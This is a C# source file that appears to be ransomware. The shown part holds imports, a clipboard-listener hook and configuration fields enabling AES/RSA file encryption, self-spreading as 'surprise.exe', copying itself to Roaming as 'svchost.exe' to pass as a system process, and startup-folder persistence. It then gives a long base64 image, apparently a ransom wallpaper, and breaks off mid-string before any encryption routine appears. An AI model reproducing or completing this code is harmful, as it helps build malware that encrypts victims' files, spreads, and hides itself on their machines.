using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "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